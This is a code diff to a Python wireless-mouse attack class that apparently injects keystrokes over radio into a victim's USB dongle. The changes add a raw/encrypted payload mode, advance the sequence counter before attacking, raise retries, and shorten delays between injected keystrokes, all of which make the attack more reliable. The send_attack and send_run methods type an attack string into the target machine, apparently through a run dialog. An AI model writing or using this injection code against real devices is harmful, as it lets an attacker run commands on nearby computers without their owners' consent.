@@ -171,7 +171,7 @@ class mouse:
     # ...etc. There are more on http://www.freebsddiary.org/APC/usb_hid_usages.php
   }
 
-  def __init__(self, radio, address, ack_timeout=250, retries=1):
+  def __init__(self, radio, address, ack_timeout=250, retries=3):
     self.radio = radio
     self.address = address
     self.string_address = ':'.join('{:02X}'.format(b) for b in address)
@@ -179,6 +179,7 @@ class mouse:
     self.payload = [0] * 19
     self.channels = range(2, 84)
     self.pingable = True
+    self.encrypted = True
 
     # Format the ACK timeout and auto retry values
     self.ack_timeout = int(ack_timeout / 250) - 1
@@ -192,7 +193,10 @@ class mouse:
     return p
 
   def serialize(self, p):
-    return str(bytearray(self.decrypt(p)))
+    if self.encrypted:
+      return str(bytearray(self.decrypt(p)))
+    else:
+      return str(bytearray(p))
 
   def hid_decode(hid, meta):
     if key in self.hid_map:
@@ -245,15 +249,18 @@ class mouse:
     self.radio.transmit_payload(self.serialize(self.payload), self.ack_timeout, self.retries)
 
   def send_attack(self, attack):
+    for _ in range(20):
+      self.inc_sequence()
+
     for _ in range(3):
       self.transmit()
 
     self.send_run()
     for c in attack:
       self.transmit(c)
-      time.sleep(0.01)
+      time.sleep(0.005)
       self.transmit()
-      time.sleep(0.02)
+      time.sleep(0.005)
 
   def send_run(self):
     self.payload[6] = 67
@@ -275,6 +282,7 @@ class mouse:
         self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
         self.channels = [21, 23, 25, 46, 50, 56, 60, 72, 74, 78]
         self.pingable = False
+        self.encrypted = False
       elif payload[0] == 0x0a:
         p = self.decrypt(payload)
         if p[6] == 0x40:
@@ -282,6 +290,7 @@ class mouse:
           self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
           self.channels = range(2, 84)
           self.pingable = True
+          self.encrypted = True
 
 
 def _debug(text):
